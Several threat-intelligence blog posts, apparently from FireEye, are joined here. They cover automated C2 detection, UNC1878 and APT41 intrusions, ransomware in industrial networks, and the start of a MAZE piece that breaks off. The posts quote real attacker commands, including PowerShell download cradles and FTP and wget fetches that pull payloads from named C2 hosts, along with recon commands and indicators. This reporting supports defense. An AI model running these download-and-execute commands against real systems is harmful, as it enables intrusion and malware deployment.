Five days after the QUADAGENT dropper was identified, Mandiant was engaged by a victim that was targeted via the same C2. This activity was later attributed to APT34. During the investigation, Mandiant uncovered APT34 using RULER.HOMEPAGE. This was the first time our consultants observed the tool and technique used in the wild by a real threat actor. Our team developed a profile of servers hosting HOMEPAGE payloads and began tracking their deployment in the wild. Figure 2 shows a timeline of QUADAGENT C2 servers discovered between February and November of 2018. Figure 2: Timeline of QUADAGENT C2 servers discovered throughout 2018 APT33 RULER.HOMEPAGE, POSHC2, and POWERTON A month after that aforementioned intrusion, Managed Defense discovered a threat actor using RULER.HOMEPAGE to download and execute POSHC2. All the RULER.HOMEPAGE servers were previously identified due to our efforts. Our team developed a profile for POSHC2 and began tracking their deployment in the wild. The threat actor pivoted to a novel PowerShell backdoor, POWERTON. Our team repeated our workflow and began illuminating those C2 servers as well. This activity was later attributed to APT33 and was documented in our OVERRULED post . SCANdalous Scanner, Better, Faster, Stronger Our use of scan data was proving wildly successful, and we wanted to use more of it, but we needed to innovate. How could we leverage this dataset and methodology to track not one or two, but dozens of active groups that we observe across our solutions and services? Even if every member of Advanced Practices was dedicated to external detection, we would still not have enough time or resources to keep up with the amount of manual work required. But that’s the key word: Manual . Our workflow consumed hours of individual analyst actions, and we had to change that. This was the beginning of SCANdalous: An automated system for external detection using third-party network scan data. A couple of nice things about computers: They’re great at multitasking, and they don’t forget. The tasks that were taking us hours to do—if we had time, and if we remembered to do them every day—were now taking SCANdalous minutes if not seconds. This not only afforded us additional time for analysis, it gave us the capability to expand our scope. Now we not only look for specific groups, we also search for common malware, tools and frameworks in general. We deploy weak signals (or broad signatures) for software that isn’t inherently bad, but is often used by threat actors. Our external detection was further improved by automating additional collection tasks, executed by SCANdalous upon a discovery—we call them follow-on actions. For example, if an interesting open directory is identified, acquire certain files. These actions ensure the team never misses an opportunity during “non-working hours.” If SCANdalous finds something interesting on a weekend or holiday, we know it will perform the time-sensitive tasks against the server and in defense of our clients. The data we collect not only helps us track things we aren’t seeing at our clients, it allows us to provide timely and historical context to our incident responders and security analysts. Taking observations from Mandiant Incident Response or Managed Defense and distilling them into knowledge we can carry forward has always been our bread and butter. Now, with SCANdalous in the mix, we can project that knowledge out onto the Internet as a whole. Collection Metrics Looking back on where we started with our manual efforts, we’re pleased to see how far this project has come, and is perhaps best illustrated by examining the numbers. Today (and as we write these continue to grow), SCANdalous holds over five thousand signatures across multiple sources, covering dozens of named malware families and threat groups. Since its inception, SCANdalous has produced over two million hits. Every single one of those, a piece of contextualized data that helps our team make analytical decisions. Of course, raw volume isn’t everything, so let’s dive a little deeper. When an analyst discovers that an IP address has been used by an adversary against a named organization, they denote that usage in our knowledge store. While the time at which this observation occurs does not always correlate with when it was used in an intrusion, knowing when we became aware of that use is still valuable. We can cross-reference these times with data from SCANdalous to help us understand the impact of our external detection. Looking at the IP addresses marked by an analyst as observed at a client in the last year, we find that 21.7% (more than one in five) were also found by SCANdalous. Of that fifth, SCANdalous has an average lead time of 47 days. If we only consider the IP addresses that SCANdalous found first, the average lead time jumps to 106 days. Going even deeper and examining this data month-to-month, we find a steady upward trend in the percentage of IP addresses identified by SCANdalous before being observed at a client (Figure 3). Figure 3: Percentage of IP addresses found by SCANdalous before being marked as observed at a client by a FireEye analyst A similar pattern can be seen for SCANdalous’ average lead time over the same data (Figure 4). Figure 4: Average lead time in days for SCANdalous over the same data shown in Figure 3 As we continue to create signatures and increase our external detection efforts, we can see from these numbers that the effectiveness and value of the resulting data grow as well. SCANdalous Case Studies Today in Advanced Practices, SCANdalous is a core element of our external detection work. It has provided us with a new lens through which we can observe threat activity on a scale and scope beyond our organic data, and enriches our workflows in support of Mandiant. Here are a few of our favorite examples: FIN6 In early 2019, SCANdalous identified a Cobalt Strike C2 server that we were able to associate with FIN6. Four hours later, the server was used to target a Managed Defense client, as discussed in our blog post, Pick-Six: Intercepting a FIN6 Intrusion, an Actor Recently Tied to Ryuk and LockerGoga Ransomware . FIN7 In late 2019, SCANdalous identified a BOOSTWRITE C2 server and automatically acquired keying material that was later used to decrypt files found in a FIN7 intrusion worked by Mandiant consultants, as discussed in our blog post, Mahalo FIN7: Responding to the Criminal Operators’ New Tools and Techniques . UNC1878 (financially motivated) Some of you may also remember our recent blog post on UNC1878 . It serves as a great case study for how we grow an initial observation into a larger set of data, and then use that knowledge to find more activity across our offerings. Much of the early work that went into tracking that activity (see the section titled “Expansion”) happened via SCANdalous. The quick response from Managed Defense gave us just enough information to build a profile of the C2 and let our automated system take it from there. Over the next couple months, SCANdalous identified numerous servers matching UNC1878’s profile. This allowed us to not only analyze and attribute new network infrastructure, it also helped us observe when and how they were changing their operations over time. Conclusion There are hundreds more stories to tell, but the point is the same. When we find value in an analytical workflow, we ask ourselves how we can do it better and faster. The automation we build into our tools allows us to not only accomplish more of the work we were doing manually, it enables us to work on things we never could before. Of course, the conversion doesn’t happen all at once. Like all good things, we made a lot of incremental improvements over time to get where we are today, and we’re still finding ways to make more. Continuing to innovate is how we keep moving forward – as Advanced Practices, as FireEye, and as an industry.

                "text": "When we discover new intrusions, we ask ourselves questions that will help us understand the totality of the activity set. How common is this activity? Is there anything unique or special about this malware or campaign? What is new and what is old in terms of TTPs or infrastructure? Is this being seen anywhere else? What information do I have that substantiates the nature of this threat actor? To track a fast-moving adversary over time, we exploit organic intrusion data, pivot to other data sets, and make that knowledge actionable for analysts and incident responders, enabling new discoveries and assessments on the actor. The FireEye Advanced Practices team exists to know more about the adversary than anyone else, and by asking and answering questions such as these, we enable analyst action in security efforts. In this blog post, we highlight how our cycle of identification, expansion, and discovery was used to track a financially motivated actor across FireEye’s global data sets. Identification On January 29, 2020, FireEye Managed Defense investigated multiple TRICKBOT deployments against a U.S. based client. Shortly after initial deployment, TRICKBOT’s networkDll module ran the following network reconnaissance commands (Figure 1). ipconfig /all net config workstation net view /all net view /all /domain nltest /domain_trusts nltest /domain_trusts /all_trusts Figure 1: Initial Reconnaissance Approximately twenty minutes after reconnaissance, the adversary ran a PowerShell command to download and execute a Cobalt Strike HTTPS BEACON stager in memory (Figure 2). cmd.exe /c powershell.exe -nop –w hidden –c “IEX ((new-object net.webclient).downloadstring(‘hxxps://cylenceprotect[.]com:80/abresgbserthgsbabrt’))” Figure 2: PowerShell download cradle used to request a Cobalt Strike stager Six minutes later, Managed Defense identified evidence of enumeration and attempted lateral movement through the BEACON implant. Managed Defense alerted the client of the activity and the affected hosts were contained, stopping the intrusion in its tracks. A delta of approximately forty-six minutes between a TRICKBOT infection and attempted lateral movement was highly unusual and, along with the clever masquerade domain, warranted further examination by our team. Although light, indicators from this intrusion were distinct enough to create an uncategorized threat group, referred to as UNC1878. At the time of initial clustering, UNC1878’s intent was not fully understood due to the rapid containment of the intrusion by Managed Defense. By creating this label, we are able to link activity from the Managed Defense investigation into a single entity, allowing us to expand our understanding of this group and track their activity over time. This is especially important when dealing with campaigns involving mass malware, as it helps delineate the interactive actor from the malware campaign they are leveraging. For more information on our clustering methodology, check out our post about how we analyze, separate, or merge these clusters at scale . Expansion Pivoting on the command and control (C2) domain allowed us to begin building a profile of UNC1878 network infrastructure. WHOIS records for cylenceprotect[.]com (Figure 3) revealed that the domain was registered on January 27, 2020, with the registrar \"Hosting Concepts B.V. d/b/a Openprovider\", less than two days before we saw this domain used in activity impacting the Managed Defense customer. Domain Name: cylenceprotect.com Registry Domain ID: 2485487352_DOMAIN_COM-VRSN Registrar WHOIS Server: whois.registrar.eu Registrar URL: http://www.registrar.eu Updated Date: 2020-01-28T00:35:43Z Creation Date: 2020-01-27T23:32:18Z Registrar Registration Expiration Date: 2021-01-27T23:32:18Z Registrar: Hosting Concepts B.V. d/b/a Openprovider Figure 3: WHOIS record for the domain cylenceprotect[.]com Turning our attention to the server, the domain resolved to 45.76.20.140, an IP address owned by the VPS provider Choopa. In addition, the domain used self-hosted name servers ns1.cylenceprotect[.]com and ns2.cylenceprotect[.]com, which also resolved to the Choopa IP address. Network scan data for the server uncovered a certificate on port 80 and 443, a snippet of which can be seen in Figure 4. Certificate: Data: Version: 3 (0x2) Serial Number: 03:a8:60:02:c7:dd:7f:88:5f:2d:86:0d:88:41:e5:3e:25:f0 Signature Algorithm: sha256WithRSAEncryption Issuer: C=US, O=Let's Encrypt, CN=Let's Encrypt Authority X3 Validity Not Before: Jan 28 02:02:14 2020 GMT Not After : Apr 27 02:02:14 2020 GMT Subject: CN=cylenceprotect[.]com Figure 4: TLS Certificate for the domain cylenceprotect[.]com The certificate was issued by Let’s Encrypt, with the earliest validity date within 24 hours of the activity detected by Managed Defense, substantiating the speed in which this threat actor operates. Along with the certificate in Figure 4, we also identified the default generated, self-signed Cobalt Strike certificate (Figure 5) on port 54546 (50050 by default). Certificate: Data: Version: 3 (0x2) Serial Number: 1843990795 (0x6de9110b) Signature Algorithm: sha256WithRSAEncryption Issuer: C=Earth, ST=Cyberspace, L=Somewhere, O=cobaltstrike, OU=AdvancedPenTesting, CN=Major Cobalt Strike Validity Not Before: Jan 28 03:06:30 2020 GMT Not After : Apr 27 03:06:30 2020 GMT Subject: C=Earth, ST=Cyberspace, L=Somewhere, O=cobaltstrike, OU=AdvancedPenTesting, CN=Major Cobalt Strike Figure 5: Default Cobalt Strike TLS Certificate used by UNC1878 Similar to the certificate on port 80 and 443, the earliest validity date was again within 24 hours of the intrusion identified by Managed Defense. Continuing analysis on the server, we acquired the BEACON stager and subsequent BEACON payload, which was configured to use the Amazon malleable C2 profile . While these indicators may not hold significant weight on their own, together they create a recognizable pattern to fuel proactive discovery of related infrastructure. We began hunting for servers that exhibited the same characteristics as those used by UNC1878. Using third-party scan data, we quickly identified additional servers that matched a preponderance of UNC1878 tradecraft: Domains typically comprised of generic IT or security related terms such as “update”, “system”, and “service”. Domains registered with “Hosting Concepts B.V. d/b/a Openprovider\" as early as December 19, 2019. Self-hosted name servers. Let’s Encrypt certificates on port 80. Virtual private servers hosted predominantly by Choopa. BEACON payloads configured with the Amazon malleable C2 profile. Cobalt Strike Teams Servers on non-standard ports. Along with certificates matching UNC1878 tradecraft, we also found self-signed Armitage certificates, indicating this group may use multiple offensive security tools. Pivoting on limited indicators extracted from a single Managed Defense intrusion, a small cluster of activity was expanded into a more diverse set of indicators cardinal to UNC1878. While the objective and goal of this threat actor had not yet manifested, the correlation of infrastructure allowed our team to recognize this threat actor’s operations against other customers. Discovery With an established modus operandi for UNC1878, our team quickly identified several related intrusions in support of FireEye Mandiant investigations over the next week. Within two days of our initial clustering and expansion of UNC1878 from the original Managed Defense investigation, Mandiant Incident Responders were investigating activity at a U.S. based medical equipment company with several indicators we had previously identified and attributed to UNC1878. Attributed domains, payloads and methodologies provided consultants with a baseline to build detections on, as well as a level of confidence in the actor’s capabilities and speed in which they operate. Three days later, UNC1878 was identified during another incident response engagement at a restaurant chain. In this engagement, Mandiant consultants found evidence of attempted deployment of RYUK ransomware on hundreds of systems, finally revealing UNC1878’s desired end goal. In the following weeks, we continued to encounter UNC1878 in various phases of their intrusions at several Mandiant Incident Response and Managed Defense customers. While services data offers us a depth of understanding into these intrusions, we turn to our product telemetry to understand the breadth of activity, getting a better worldview and perspective on the global prevalence of this threat actor. This led to the discovery of an UNC1878 intrusion at a technology company, resulting in Mandiant immediately notifying the affected customer. By correlating multiple UNC1878 intrusions across our services and product customers, it became evident that the targeting was indiscriminate, a common characteristic of opportunistic ransomware campaigns. Although initially there were unanswered questions surrounding UNC1878’s intent, we were able to provide valuable insights into their capabilities to our consultants and analysts. In turn, the intrusion data gathered during these engagements continued the cycle of building our understanding of UNC1878’s tradecraft, enabling our responders to handle these incidents swiftly in the face of imminent ransomware deployment. Conclusion Threat actors continue to use mass malware campaigns to establish footholds into target environments, followed by interactive operations focused on deploying ransomware such as RYUK, DOPPLEPAYMER and MAZE. Looking at the overall trend of intrusions FireEye responds to, the growing shift from traditional PCI theft to ransomware has allowed threat actors such as UNC1878 to widen their scope and increase their tempo, costing organizations millions of dollars due to business disruption and ransom payments. However, apart from their speed, UNC1878 does not stand out among the increasing number of groups following this trend, and should not be the key takeaway of this blog post. The cycle of analysis and discovery used for UNC1878 lies at the core of our team’s mission to rapidly detect and pursue impactful adversaries at scale. Starting from a singular intrusion at a Managed Defense client, we were able to discover UNC1878 activity at multiple customers. Using our analysis of the early stages of their activity allowed us to pivot and pursue this actor across otherwise unrelated investigations. As we refine and expand our understanding of UNC1878’s tradecraft, our team enables Mandiant and Managed Defense to efficiently identify, respond to, and eradicate a financially motivated threat actor whose end goal could cripple targeted organizations. The principles applied in pursuit of this actor are crucial to tracking any adversary and are ultimately how the Advanced Practices team surfaces meaningful activity across the FireEye ecosystem.

                "text": "Beginning this year, FireEye observed Chinese actor APT41 carry out one of the broadest campaigns by a Chinese cyber espionage actor we have observed in recent years. Between January 20 and March 11, FireEye observed APT41 attempt to exploit vulnerabilities in Citrix NetScaler/ADC , Cisco routers, and Zoho ManageEngine Desktop Central at over 75 FireEye customers. Countries we’ve seen targeted include Australia, Canada, Denmark, Finland, France, India, Italy, Japan, Malaysia, Mexico, Philippines, Poland, Qatar, Saudi Arabia, Singapore, Sweden, Switzerland, UAE, UK and USA. The following industries were targeted: Banking/Finance, Construction, Defense Industrial Base, Government, Healthcare, High Technology, Higher Education, Legal, Manufacturing, Media, Non-profit, Oil & Gas, Petrochemical, Pharmaceutical, Real Estate, Telecommunications, Transportation, Travel, and Utility. It’s unclear if APT41 scanned the Internet and attempted exploitation en masse or selected a subset of specific organizations to target, but the victims appear to be more targeted in nature. Exploitation of CVE-2019-19781 (Citrix Application Delivery Controller [ADC]) Starting on January 20, 2020, APT41 used the IP address 66.42.98[.]220 to attempt exploits of Citrix Application Delivery Controller (ADC) and Citrix Gateway devices with CVE-2019-19781 (published December 17, 2019). Figure 1: Timeline of key events The initial CVE-2019-19781 exploitation activity on January 20 and January 21, 2020, involved execution of the command ‘file /bin/pwd’, which may have achieved two objectives for APT41. First, it would confirm whether the system was vulnerable and the mitigation wasn’t applied. Second, it may return architecture-related information that would be required knowledge for APT41 to successfully deploy a backdoor in a follow-up step. One interesting thing to note is that all observed requests were only performed against Citrix devices, suggesting APT41 was operating with an already-known list of identified devices accessible on the internet.

This has been a common activity pattern by Chinese APT groups in past years as well. Starting on February 1, 2020, APT41 moved to using CVE-2019-19781 exploit payloads that initiate a download via the File Transfer Protocol (FTP). Specifically, APT41 executed the command ‘/usr/bin/ftp -o /tmp/bsd ftp://test:[redacted]\\@66.42.98[.]220/bsd’, which connected to 66.42.98[.]220 over the FTP protocol, logged in to the FTP server with a username of ‘test’ and a password that we have redacted, and then downloaded an unknown payload named ‘bsd’ (which was likely a backdoor).

China initiated COVID-19 related quarantines in cities in Hubei province starting on January 23 and January 24, and rolled out quarantines to additional provinces starting between February 2 and February 10. While it is possible that this reduction in activity might be related to the COVID-19 quarantine measures in China, APT41 may have remained active in other ways, which we were unable to observe with FireEye telemetry. We observed a significant uptick in CVE-2019-19781 exploitation on February 24 and February 25. The exploit behavior was almost identical to the activity on February 1, where only the name of the payload ‘un’ changed.

Cisco Router Exploitation On February 21, 2020, APT41 successfully exploited a Cisco RV320 router at a telecommunications organization and downloaded a 32-bit ELF binary payload compiled for a 64-bit MIPS processor named ‘fuc’ (MD5: 155e98e5ca8d662fad7dc84187340cbc). It is unknown what specific exploit was used, but there is a Metasploit module that combines two CVE’s ( CVE-2019-1653 and CVE-2019-1652 ) to enable remote code execution on Cisco RV320 and RV325 small business routers and uses wget to download the specified payload. GET /test/fuc HTTP/1.1 Host: 66.42.98\\.220 User-Agent: Wget Connection: close Figure 5: Example HTTP request showing Cisco RV320 router downloading a payload via wget 66.42.98[.]220 also hosted a file name http://66.42.98[.]220/test/1.txt. The content of 1.txt (MD5:  c0c467c8e9b2046d7053642cc9bdd57d) is ‘cat /etc/flash/etc/nk_sysconfig’, which is the command one would execute on a Cisco RV320 router to display the current configuration. Cisco PSIRT confirmed that fixed software to address the noted vulnerabilities is available and asks customers to review the following security advisories and take appropriate action: Cisco Small Business RV320 and RV325 Routers Information Disclosure Vulnerability Cisco Small Business RV320 and RV325 Routers Command Injection Vulnerability Exploitation of CVE-2020-10189 (Zoho ManageEngine Zero-Day Vulnerability) On March 5, 2020, researcher Steven Seeley , published an advisory and released proof-of-concept code for a zero-day remote code execution vulnerability in Zoho ManageEngine Desktop Central versions prior to 10.0.474 ( CVE-2020-10189) . Beginning on March 8, FireEye observed APT41 use 91.208.184[.]78 to attempt to exploit the Zoho ManageEngine vulnerability at more than a dozen FireEye customers, which resulted in the compromise of at least five separate customers. FireEye observed two separate variations of how the payloads (install.bat and storesyncsvc.dll) were deployed. In the first variation the CVE-2020-10189 exploit was used to directly upload “logger.zip”, a simple Java based program, which contained a set of commands to use PowerShell to download and execute install.bat and storesyncsvc.dll. java/lang/Runtime getRuntime ()Ljava/lang/Runtime; Xcmd /c powershell $client = new-object System.Net.WebClient;$client.DownloadFile('http://66.42.98[.]220:12345/test/install.bat','C:\\ Windows\\Temp\\install.bat')&powershell $client = new-object System.Net.WebClient;$client.DownloadFile('http://66.42.98[.]220:12345/test/storesyncsvc.dll',' C:\\Windows\\Temp\\storesyncsvc.dll')&C:\\Windows\\Temp\\install.bat '(Ljava/lang/String;)Ljava/lang/Process; StackMapTable ysoserial/Pwner76328858520609 Lysoserial/Pwner76328858520609; Figure 6: Contents of logger.zip Here we see a toolmark from the tool ysoserial that was used to create the payload in the POC. The string Pwner76328858520609 is unique to the POC payload, indicating that APT41 likely used the POC as source material in their operation. In the second variation, FireEye observed APT41 leverage the Microsoft BITSAdmin command-line tool to download install.bat (MD5: 7966c2c546b71e800397a67f942858d0) from known APT41 infrastructure 66.42.98[.]220 on port 12345.

The file 2.exe was a VMProtected Meterpreter downloader used to download Cobalt Strike BEACON shellcode. The usage of VMProtected binaries is another very common TTP that we’ve observed this group leverage in multiple intrusions in order to delay analysis of other tools in their toolkit.

We believe this is an example of the actor attempting to diversify post-exploitation access to the compromised systems. ManageEngine released a short term mitigation for CVE-2020-10189 on January 20, 2020, and subsequently released an update on March 7, 2020, with a long term fix. Outlook This activity is one of the most widespread campaigns we have seen from China-nexus espionage actors in recent years. While APT41 has previously conducted activity with an extensive initial entry such as the trojanizing of NetSarang software, this scanning and exploitation has focused on a subset of our customers , and seems to reveal a high operational tempo and wide collection requirements for APT41. It is notable that we have only seen these exploitation attempts leverage publicly available malware such as Cobalt Strike and Meterpreter. While these backdoors are full featured, in previous incidents APT41 has waited to deploy more advanced malware until they have fully understood where they were and carried out some initial reconnaissance. In 2020, APT41 continues to be one of the most prolific threats that FireEye currently tracks. This new activity from this group shows how resourceful and how quickly they can leverage newly disclosed vulnerabilities to their advantage. Previously, FireEye Mandiant Managed Defense identified APT41 successfully leverage CVE-2019-3396 (Atlassian Confluence) against a U.S. based university. While APT41 is a unique state-sponsored Chinese threat group that conducts espionage, the actor also conducts financially motivated activity for personal gain.

                "text": "Since at least 2017, there has been a significant increase in public disclosures of ransomware incidents impacting industrial production and critical infrastructure organizations. Well-known ransomware families like WannaCry, LockerGoga, MegaCortex, Ryuk, Maze, and now SNAKEHOSE (a.k.a. Snake / Ekans), have cost victims across a variety of industry verticals many millions of dollars in ransom and collateral costs. These incidents have also resulted in significant disruptions and delays to the physical processes that enable organizations to produce and deliver goods and services. While lots of information has been shared about the victims and immediate impacts of industrial sector ransomware distribution operations, the public discourse continues to miss the big picture. As financial crime actors have evolved their tactics from opportunistic to post-compromise ransomware deployment, we have observed an increase in adversaries’ internal reconnaissance that enables them to target systems that are vital to support the chain of production. As a result, ransomware infections—either affecting critical assets in corporate networks or reaching computers in OT networks—often result in the same outcome: insufficient or late supply of end products or services. Truly understanding the unique nuances of industrial sector ransomware distribution operations requires a combination of skillsets and visibility across both IT and OT systems. Using examples derived from our consulting engagements and threat research, we will explain how the shift to post-compromise ransomware operations is fueling adversaries’ ability to disrupt industrial operations. Industrial Sector Ransomware Distribution Poses Increasing Risk as Actors Move to Post-Compromise Deployment The traditional approach to ransomware attacks predominantly relies on a “shotgun” methodology that consists of indiscriminate campaigns spreading malware to encrypt files and data from a variety of victims. Actors following this model will extort victims for an average of $500 to $1,000 USD and hope to receive payments from as many individuals as possible. While early ransomware campaigns adopting this approach were often considered out of scope for OT security, recent campaigns targeting entire industrial and critical infrastructure organizations have moved toward adopting a more operationally complex post-compromise approach. In post-compromise ransomware incidents, a threat actor may still often rely on broadly distributed malware to obtain their initial access to a victim environment, but once on a network they will focus on gaining privileged access so they can explore the target networks and identify critical systems before deploying the ransomware. This approach also makes it possible for the attacker to disable security processes that would normally be enough to detect known ransomware indicators or behaviors. Actors cast wider nets that may impact critical systems, which  expand the scale and effectiveness of their end-stage operations by inflicting maximum pain on the victim. As a result, they are better positioned to negotiate and can often demand much higher ransoms—which are commonly commensurate with the victims’ perceived ability to pay and the value of the ransomed assets themselves. For more information, including technical detail, on similar activity, see our recent blog posts on FIN6 and TEMP.MixMaster . Figure 1: Comparison of indiscriminate vs. post-compromise ransomware approaches Historical incidents involving the opportunistic deployment of ransomware have often been limited to impacting individual computers, which occasionally included OT intermediary systems that were either internet-accessible, poorly segmented, or exposed to infected portable media. In 2017, we also observed campaigns such as NotPetya and BadRabbit, where wiper malware with worm-like capabilities were released to disrupt organizations while masquerading as ransomware. While these types of campaigns pose a threat to industrial production, the adoption of post-compromise deployment presents three major twists in the plot. As threat actors tailor their attacks to target specific industries or organizations, companies with high-availability requirements (e.g., public utilities, hospitals, and industrial manufacturing) and perceived abilities to pay ransoms (e.g., higher revenue companies) become prime targets. This represents an expansion of financial crime actors’ targeting of industries that process directly marketable information (e.g., credit card numbers or customer data) to include the monetization of production environments. As threat actors perform internal reconnaissance and move laterally across target networks before deploying ransomware, they are now better positioned to cast wide nets that impact the target’s most critical assets and negotiate from a privileged position. Most importantly, many of the tactics, techniques, and procedures (TTPs) often used by financial actors in the past, resemble those employed by high-skilled actors across the initial and middle stages of the attack lifecycle of past OT security incidents. Therefore, financial crime actors are likely capable of pivoting to and deploying ransomware in OT intermediary systems to further disrupt operations. Organized Financial Crime Actors Have Demonstrated an Ability to Disrupt OT Assets An actor’s capability to obtain financial benefits from post-compromise ransomware deployment depends on many factors, one of which is the ability to disrupt systems that are the most relevant to the core mission of the victim organizations. As a result, we can expect mature actors to gradually broaden their selection from only IT and business processes, to also OT assets monitoring and controlling physical processes. This is apparent in ransomware families such as SNAKEHOSE, which was designed to execute its payload only after stopping a series of processes that included some industrial software from vendors such as General Electric and Honeywell. At first glance, the SNAKEHOSE kill list appeared to be specifically tailored to OT environments due to the relatively small number of processes (yet high number of OT-related processes) identified with automated tools for initial triage. However, after manually extracting the list from the function that was terminating the processes, we determined that the kill list utilized by SNAKEHOSE actually targets over 1,000 processes. In fact, we have observed very similar process kill lists deployed alongside samples from other ransomware families, including LockerGoga, MegaCortex, and Maze. Not surprisingly, all of these code families have been associated with high-profile incidents impacting industrial organizations for the past two years. The earliest kill list containing OT processes we identified was a batch script deployed alongside LockerGoga in January 2019. The list is very similar to those used later in MegaCortex incidents, albeit with notable exceptions, such as an apparent typo on an OT-related process that is not present in our SNAKEHOSE or MegaCortex samples: “proficyclient.exe4”. The absence of this typo in the SNAKEHOSE and MegaCortex samples could indicate that one of these malware authors identified and corrected the error when initially copying the OT-processes from the LockerGoga list, or that the LockerGoga author failed to properly incorporate the processes from some theoretical common source of origin, such as a dark web post. Figure 2: ‘proficyclient.exe’ spelling in kill lists deployed with LockerGoga (left) and SNAKEHOSE (right) Regardless of which ransomware family first employed the OT-related processes in a kill list or where the malware authors acquired the list, the seeming ubiquity of this list across malware families suggests that the list itself is more noteworthy than any individual malware family that has implemented it. While the OT processes identified in these lists may simply represent the coincidental output of automated process collection from target environments and not a targeted effort to impact OT, the existence of this list provides financial crime actors opportunities to disrupt OT systems. Furthermore, we expect that as financially motivated threat actors continue to impact industrial sector organizations, become more familiar with OT, and identify dependencies across IT and OT systems, they will develop capabilities—and potentially intent—to disrupt other systems and environments running industrial software products and technology. Ransomware Deployments in Both IT and OT Systems Have Impacted Industrial Production As a result of adversaries’ post-compromise strategy and increased awareness of industrial sector targets, ransomware incidents have effectively impacted industrial production regardless of whether the malware was deployed in IT or OT. Ransomware incidents encrypting data from servers and computers in corporate networks have resulted in direct or indirect disruptions to physical production processes overseen by OT networks. This has caused insufficient or late supply of end products or services, representing long-term financial losses in the form of missed business opportunities, costs for incident response, regulatory fines, reputational damage, and sometimes even paid ransoms. In certain sectors, such as utilities and public services, high availability is also critical to societal well-being. The best-known example of ransomware impacting industrial production due to an IT network infection is Norsk Hydro’s incident from March 2019, where disruptions to Business Process Management Systems (BPMS) forced multiple sites to shut down automation operations. Among other collateral damage, the ransomware interrupted communication between IT systems that are commonly used to manage resources across the production chain. Interruptions to these flows of information containing for example product inventories, forced employees to identify manual alternatives to handle more than 6,500 stock-keeping units and 4,000 shelves. FireEye Mandiant has responded to at least one similar case where TrickBot was used to deploy Ryuk ransomware at an oil rig manufacturer. While the infection happened only on corporate networks, the biggest business impact was caused by disruptions of Oracle ERP software driving the company temporarily offline and negatively affecting production. Ransomware may result in similar outcomes when it reaches IT-based assets in OT networks, for example human-machine interfaces (HMIs), supervisory control and data acquisition (SCADA) software, and engineering workstations. Most of this equipment relies on commodity software and standard operating systems that are vulnerable to a variety of IT threats. Mandiant Intelligence is aware of at least one incident in which an industrial facility suffered a plant shutdown due to a large-scale ransomware attack, based on sensitive sources. The facility's network was improperly segmented, which allowed the malware to propagate from the corporate network into the OT network, where it encrypted servers, HMIs, workstations, and backups. The facility had to reach out to multiple vendors to retrieve backups, many of which were decades old, which delayed complete restoration of production. As recently as February 2020, the Cybersecurity Infrastructure and Security Agency (CISA) released Alert AA20-049A describing how a post-compromise ransomware incident had affected control and communication assets on the OT network of a natural gas compression facility. Impacts to HMIs, data historians, and polling servers resulted in loss of availability and loss of view for human operators. This prompted an intentional shut down of operations that lasted two days. Mitigating the Effects of Ransomware Requires Defenses Across IT and OT Threat actors deploying ransomware have made rapid advances both in terms of effectiveness and as a criminal business model, imposing high operational costs on victims. We encourage all organizations to evaluate their safety and industrial risks related to ransomware attacks. Note that these recommendations will also help to build resilience in the face of other threats to business operations (e.g., cryptomining malware infections). While every case will differ, we highlight the following recommendations. For custom services and actionable intelligence in both IT and OT, contact FireEye Mandiant Consulting , Managed Defense , and Threat Intelligence . Conduct tabletop and/or controlled red team exercises to assess the current security posture and ability of your organization to respond to the ransomware threat. Simulate attack scenarios (mainly in non-production environments) to understand how the incident response team can (or cannot) detect, analyze, and recover from such an attack. Revisit recovery requirements based on the exercise results. In general, repeatedly practicing various threat scenarios will improve awareness and ability to respond to real incidents. Review operations, business processes, and workflows to identify assets that are critical to maintaining continuous industrial operations. Whenever possible, introduce redundancy for critical assets with low tolerance to downtime. The right amount and type of redundancy is unique for each organization and can be determined through risk assessments and cost-benefit analyses. Note that such analyses cannot be conducted without involving business process owners and collaborating across IT and OT. Logically segregate primary and redundant assets either by a network-based or host-based firewall with subsequent asset hardening (e.g., disabling services typically used by ransomware for its propagation, like SMB, RDP, and WMI). In addition to creating policies to disable unnecessary peer-to-peer and remote connections, we recommend routine auditing of all systems that potentially host these services and protocols. Note that such architecture is generally more resilient to security incidents. When establishing a rigorous back-up program, special attention should be paid to ensuring the security (integrity) of backups. Critical backups must be kept offline or, at minimum, on a segregated network. Optimize recovery plans in terms of recovery time objective. Introduce required alternative workflows (including manual) for the duration of recovery. This is especially critical for organizations with limited or no redundancy of critical assets. When recovering from backups, harden recovered assets and the entire organization's infrastructure to prevent recurring ransomware infection and propagation. Establish clear ownership and management of OT perimeter protection devices to ensure emergency, enterprise-wide changes are possible. Effective network segmentation must be maintained during containment and active intrusions. Hunt for adversary intrusion activity in intermediary systems , which we define as the networked workstations and servers using standard operating systems and protocols. While the systems are further away from direct control of physical processes, there is a much higher likelihood of attacker presence. Note, that every organization is different, with unique internal architectures and processes, stakeholder needs, and customer expectations. Therefore, all recommendations should be carefully considered in the context of the individual infrastructures. For instance, proper network segmentation is highly advisable for mitigating the spread of ransomware. However, organizations with limited budgets may instead decide to leverage redundant asset diversification, host-based firewalls, and hardening as an alternative to segregating with hardware firewalls.

                "text": "Targeted ransomware incidents have brought a threat of disruptive and destructive attacks to organizations across industries and geographies. FireEye Mandiant Threat Intelligence has previously documented this threat in our investigations of trends across ransomware incidents , FIN6 activity , implications for OT networks , and other aspects of post-compromise ransomware deployment. Since November 2019, we’ve seen the MAZE ransomware being used in attacks that combine targeted ransomware use, public exposure of victim data, and an affiliate model. Malicious actors have been actively deploying MAZE ransomware since at least May 2019. The ransomware was initially distributed via spam emails and exploit kits before later shifting to being deployed post-compromise. Multiple actors are involved in MAZE ransomware operations, based on our observations of alleged users in underground forums and distinct tactics, techniques, and procedures across Mandiant incident response engagements. Actors behind MAZE also maintain a public-facing website where they post data stolen from victims who refuse to pay an extortion fee. The combination of these two damaging intrusion outcomes—dumping sensitive data and disrupting enterprise networks—with a criminal service makes MAZE a notable threat to many organizations. This blog post is based on information derived from numerous Mandiant incident response engagements and our own research into the MAZE ecosystem and operations. Mandiant Threat Intelligence will be available to answer questions on the MAZE ransomware threat in a May 21 webinar . Victimology We are aware of more than 100 alleged MAZE victims reported by various media outlets and on the MAZE website since November 2019. These organizations have been primarily based in North America, although victims spanned nearly every geographical region. Nearly every industry sector including manufacturing, legal, financial services, construction, healthcare, technology, retail, and government has been impacted demonstrating that indiscriminate nature of these operations (Figure 1). Figure 1: Geographical and industry distribution of alleged MAZE victims Multiple Actors Involved in MAZE Ransomware Operations Identified Mandiant identified multiple Russian-speaking actors who claimed to use MAZE ransomware and were seeking partners to fulfill different functional roles within their teams. Additional information on these actors is available to Mandiant Intelligence subscribers . A panel used to manage victims targeted for 